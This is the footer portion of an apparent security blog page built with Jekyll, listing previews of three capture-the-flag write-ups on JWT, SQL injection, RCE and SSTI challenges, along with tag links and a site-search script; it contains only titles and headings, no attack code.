          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/hackday-2025-finest/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1737806400"
  data-df="ll"
  
>
  Jan 25, 2025
</time>

              <h4 class="pt-0 my-2">HackDay - Finest</h4>
              <div class="text-muted">
                <p>Introduction
    
      Description
    
  
  Enumeration
    
      Reading Source Code
      JWT Secret Key
      SQL injection
    
  
  Exploitation
    
      Understanding the JWT
      Scrip...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/knightctf-2025-baby-injection/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1737388800"
  data-df="ll"
  
>
  Jan 20, 2025
</time>

              <h4 class="pt-0 my-2">KnightCTF - Baby Injection</h4>
              <div class="text-muted">
                <p>Enumeration
    
      Enumerating website
    
  
  Exploitation
    
      Getting RCE
      Getting flag
    
  




Enumeration

Enumerating website
Let’s start by accessing the index page:

We...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/pragyan-deathdaycard/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1739030400"
  data-df="ll"
  
>
  Feb  8, 2025
</time>

              <h4 class="pt-0 my-2">Pragyan - Deathday Card</h4>
              <div class="text-muted">
                <p>Introduction
    
      Pragyan CTF 2025
      Description
    
  
  Enumeration
    
      Reading Source Code
      Identifying vulnerabilities
    
  
  Exploitation
    
      Verifying SSTI
  ...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      

  <section>
      <h2 class="panel-heading no-border">Tags</h2>

      <nav id="toc">
        <div class="d-flex flex-wrap mt-3 mb-1 me-3">
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/hacking-tools/">hacking-tools</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/poc/">poc</a>
          
        </div>
      </nav>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

